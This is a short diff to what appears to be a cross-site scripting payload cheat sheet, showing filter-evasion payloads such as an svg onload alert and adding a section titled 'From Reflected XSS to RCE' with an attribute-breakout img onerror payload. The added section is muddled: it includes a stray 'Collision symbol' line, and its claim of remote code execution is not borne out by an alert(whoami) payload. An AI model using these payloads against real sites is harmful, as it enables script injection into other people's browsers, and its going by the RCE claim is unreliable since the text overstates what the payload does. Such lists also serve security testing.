@@ -168,3 +168,9 @@ Without ">" (XSS)
 <svg onload=alert(1)<!--
 
 <opening_tag>PAYLOAD</closing_tag>
+
+
+From Reflected XSS to RCE...BOOM 
+Collision symbol
+
+Payload: "><img src=x onerror=alert(whoami)>
